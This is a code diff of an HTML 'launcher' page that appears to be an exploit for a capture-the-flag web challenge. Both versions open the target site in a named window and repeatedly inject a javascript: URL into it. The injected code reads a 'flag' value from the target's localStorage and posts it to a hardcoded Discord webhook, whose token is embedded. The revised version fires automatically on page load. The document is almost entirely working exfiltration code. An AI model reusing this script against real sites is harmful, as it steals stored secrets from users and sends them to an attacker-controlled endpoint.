@@ -1,16 +1,30 @@
 <!doctype html>
-<button id="go">Start</button>
+<meta charset="utf-8">
+<title>launcher</title>
 <script>
-const TARGET='https://safe-url.ctfi.ng/';
-const WH='https://discord.com/api/webhooks/1411513735901741096/GLGJpZXfKdmo6cSf0XrDGJdqYkpl6xYTOqFoneDP3MZsA5GXugsxqVxoFiQ0adtzTWcb';
-document.getElementById('go').addEventListener('click', ()=>{
-  const w = window.open(TARGET,'safewin'); // opens directly to target
-  const hop = js => { try{ w.location='javascript:'+js }catch(e){} };
-  setTimeout(()=>hop(
-    'var f=localStorage.getItem("flag")||"";var d=new FormData();d.append("content",f);fetch("'+WH+'",{method:"POST",mode:"no-cors",body:d}).catch(()=>{});'
-  ),500);
-  setTimeout(()=>hop(
-    'var f=localStorage.getItem("flag")||"";navigator.sendBeacon("'+WH+'",new Blob([JSON.stringify({content:f})],{type:"application/json"}));'
-  ),1200);
-});
+const TARGET = 'https://safe-url.ctfi.ng/';
+const WH = 'https://discord.com/api/webhooks/1411513735901741096/GLGJpZXfKdmo6cSf0XrDGJdqYkpl6xYTOqFoneDP3MZsA5GXugsxqVxoFiQ0adtzTWcb';
+
+// open named window and point it at the target origin
+const w = window.open('about:blank','safewin');
+if (!w) { /* popups blocked */ location.href = TARGET; }
+else { w.location = TARGET; }
+
+// payload JS that runs *in the target window*
+const payload =
+  '(function(){try{var f=localStorage.getItem("flag")||"";'
++ 'var d=new FormData();d.append("content",f);'
++ 'fetch("'+WH+'",{method:"POST",mode:"no-cors",body:d}).catch(()=>{});'
++ 'navigator.sendBeacon && navigator.sendBeacon("'+WH+'",new Blob([JSON.stringify({content:f})],{type:"application/json"}));'
++ '}catch(e){}})()';
+
+// try hard for ~4.5s: both assign and replace, many intervals
+let tries = 0;
+function attempt(){
+  tries++;
+  try { w.location = 'javascript:' + payload; } catch(e){}
+  try { w.location.replace('javascript:' + payload); } catch(e){}
+  if (tries < 24) setTimeout(attempt, 200); // 24 * 200ms ≈ 4.8s
+}
+setTimeout(attempt, 600);
 </script>
